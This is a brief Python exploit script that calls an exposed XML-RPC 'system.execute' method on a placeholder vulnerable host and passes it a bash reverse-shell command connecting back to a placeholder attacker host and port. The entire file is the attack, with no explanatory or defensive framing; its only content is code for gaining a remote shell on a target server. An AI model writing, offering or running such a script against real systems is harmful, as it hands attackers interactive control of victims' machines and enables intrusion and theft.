import xmlrpc.client

# Target XML-RPC service
proxy = xmlrpc.client.ServerProxy("http://vulnerable-host:8000/")

# Reverse shell command
cmd = "bash -i >& /dev/tcp/attacker-host/attacker-port 0>&1"

# Execute reverse shell command through XML-RPC
proxy.system.execute(cmd)
